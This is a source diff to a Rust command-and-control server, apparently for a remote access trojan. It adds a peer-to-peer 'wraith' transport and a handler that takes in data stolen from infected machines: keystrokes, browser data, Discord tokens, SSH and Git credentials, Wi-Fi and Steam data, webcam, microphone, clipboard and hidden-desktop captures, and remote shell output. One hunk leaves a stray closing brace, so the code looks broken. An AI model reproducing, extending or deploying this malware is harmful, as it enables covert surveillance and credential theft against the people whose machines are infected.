@@ -22,6 +22,7 @@ use common::client_info::ClientInfo;
 
 pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
+    sender: Sender<ServerCommand>,
     txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
     connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
     /// Maps display addr (e.g. "79.226.87.244:49707") → real socket addr
@@ -35,10 +36,12 @@ pub struct ServerWrapper {
     log_events: Logger,
     country_reader: maxminddb::Reader<Vec<u8>>,
     auto_upload_anonfiles: bool,
+    wraith_node: Option<wraith_core::Node>,
+    wraith_to_socket: HashMap<[u8; 32], SocketAddr>,
 }
 
 impl ServerWrapper {
-    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
+    pub async fn spawn(receiver: Receiver<ServerCommand>, sender: Sender<ServerCommand>) -> Result<()> {
         let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
         let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
         let mut rng = OsRng;
@@ -55,6 +58,7 @@ impl ServerWrapper {
 
         let s = Self {
             receiver,
+            sender,
             txs,
             connected_users,
             display_to_socket: HashMap::new(),
@@ -65,6 +69,8 @@ impl ServerWrapper {
             log_events: Logger::new(),
             country_reader,
             auto_upload_anonfiles: false,
+            wraith_node: None,
+            wraith_to_socket: HashMap::new(),
         };
 
         s.channel_loop().await;
@@ -170,6 +176,48 @@ impl ServerWrapper {
         }
     }
 
+
+    async fn process_packet(&self, addr: SocketAddr, packet: ServerboundPacket) {
+        use ServerboundPacket::*;
+        let cmd = match packet {
+            ClientInfo(info) => Some(ServerCommand::RegisterClient(self.txs.get(&addr).unwrap().clone(), addr, info)),
+            ScreenshotResult(screenshot_data) => Some(ServerCommand::ScreenshotData(addr, screenshot_data)),
+            RemoteDesktopFrame(frame) => Some(ServerCommand::RemoteDesktopFrame(addr, frame)),
+            RemoteDesktopAudioChunk(chunk) => Some(ServerCommand::RemoteDesktopAudioChunk(addr, chunk)),
+            ShellOutput(output) => Some(ServerCommand::ShellOutput(addr, output)),
+            InputBoxResult(result) => Some(ServerCommand::InputBoxResult(addr, result)),
+            ProcessList(process_list) => Some(ServerCommand::ProcessList(addr, process_list)),
+            DisksResult(disks) => Some(ServerCommand::DisksResult(addr, disks)),
+            FileList(files) => Some(ServerCommand::FileList(addr, files)),
+            CurrentFolder(path) => Some(ServerCommand::CurrentFolder(addr, path)),
+            DonwloadFileResult(file_data) => Some(ServerCommand::DownloadFileResult(addr, file_data)),
+            WebcamResult(webcam_data) => Some(ServerCommand::WebcamResult(addr, webcam_data)),
+            HVNCFrame(frame_data) => Some(ServerCommand::HVNCFrame(addr, frame_data)),
+            MicAudioChunk(chunk) => Some(ServerCommand::MicAudioChunk(addr, chunk)),
+            MicRecordingFile(file_data) => Some(ServerCommand::MicRecordingFile(addr, file_data)),
+            DesktopRecordingPreviewFrame(frame) => Some(ServerCommand::DesktopRecordingPreviewFrame(addr, frame)),
+            DesktopRecordingFile(file_data) => Some(ServerCommand::DesktopRecordingFile(addr, file_data)),
+            MicDeviceList(devices) => Some(ServerCommand::MicDeviceList(addr, devices)),
+            BrowserData(data) => Some(ServerCommand::BrowserData(addr, data)),
+            WifiData(data) => Some(ServerCommand::WifiData(addr, data)),
+            SoftwareInventory(data) => Some(ServerCommand::SoftwareInventory(addr, data)),
+            GitData(data) => Some(ServerCommand::GitData(addr, data)),
+            SSHData(data) => Some(ServerCommand::SSHData(addr, data)),
+            SteamData(data) => Some(ServerCommand::SteamData(addr, data)),
+            ClipboardUpdate(data) => Some(ServerCommand::ClipboardUpdate(addr, data)),
+            ClipboardImageUpdate(data) => Some(ServerCommand::ClipboardImageUpdate(addr, data)),
+            NotificationEvent(data) => Some(ServerCommand::NotificationEvent(addr, data)),
+            DiscordTokenData(data) => Some(ServerCommand::DiscordTokenData(addr, data)),
+            KeyloggerUpdate(update) => Some(ServerCommand::KeyloggerUpdate(addr, update)),
+            KeyloggerOfflineLogs(logs) => Some(ServerCommand::KeyloggerOfflineLogs(addr, logs)),
+            _ => None,
+        };
+
+        if let Some(cmd) = cmd {
+            let _ = self.sender.send(cmd).await;
+        }
+    }
+
     async fn channel_loop(mut self) {
         while let Some(p) = self.receiver.recv().await {
             use crate::commands::ServerCommand::*;
@@ -190,6 +238,21 @@ impl ServerWrapper {
                         .await;
                 }
 
+                SetWraithNode(node) => {
+                    self.wraith_node = Some(node.clone());
+                    let mut node_clone = node.clone();
+                    let sender = self.sender.clone();
+
+                    tokio::spawn(async move {
+                        let mut rx = node_clone.subscribe_data();
+                        while let Some((peer_id, data)) = rx.recv().await {
+                            if let Ok((packet, _)) = ServerboundPacket::deserialized(&data) {
+                                let _ = sender.send(ServerCommand::WraithPacket(peer_id, packet)).await;
+                            }
+                        }
+                    });
+                }
+
                 SetTauriHandle(handle) => {
                     self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                     self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
@@ -205,12 +268,26 @@ impl ServerWrapper {
                 }
 
                 EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
-                    handle_encryption_confirm(tx, otx, enc_s, enc_t, exp_t, self.priv_key.clone())
+                    let wraith_info = if let Some(node) = &self.wraith_node {
+                        let node_id = *node.node_id();
+                        let addr = node.listen_addr().await.unwrap();
+                        let port = addr.port();
+                        let ip = addr.ip().to_string();
+                        Some((node_id, ip, port))
+                    } else {
+                        None
+                    };
+                    handle_encryption_confirm(tx, otx, enc_s, enc_t, exp_t, self.priv_key.clone(), wraith_info)
                         .await;
+                }
+
                 }
 
                 RegisterClient(tx, addr, mut client_info) => {
                     self.txs.insert(addr, tx);
+                    if let Some(wraith_id) = client_info.data.wraith_id {
+                        self.wraith_to_socket.insert(wraith_id, addr);
+                    }
                     client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
 
                     // Prefer the IP the client self-reported (fetched via my-ip.io).
@@ -252,6 +329,11 @@ impl ServerWrapper {
                 }
 
                 ClientDisconnected(addr) => {
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        if let Some(wraith_id) = client.data.wraith_id {
+                            self.wraith_to_socket.remove(&wraith_id);
+                        }
+                    }
                     if let Some(client) = self.connected_users.get(&addr) {
                         self.log_events
                             .log(
@@ -1294,6 +1376,12 @@ impl ServerWrapper {
                 StopNotificationCapture(addr) => {
                     self.handle_command(&addr, ClientboundPacket::StopNotificationCapture)
                         .await;
+                }
+
+                WraithPacket(wraith_id, packet) => {
+                    if let Some(addr) = self.wraith_to_socket.get(&wraith_id).copied() {
+                        self.process_packet(addr, packet).await;
+                    }
                 }
 
                 SetAutoUploadAnonFiles(enabled) => {
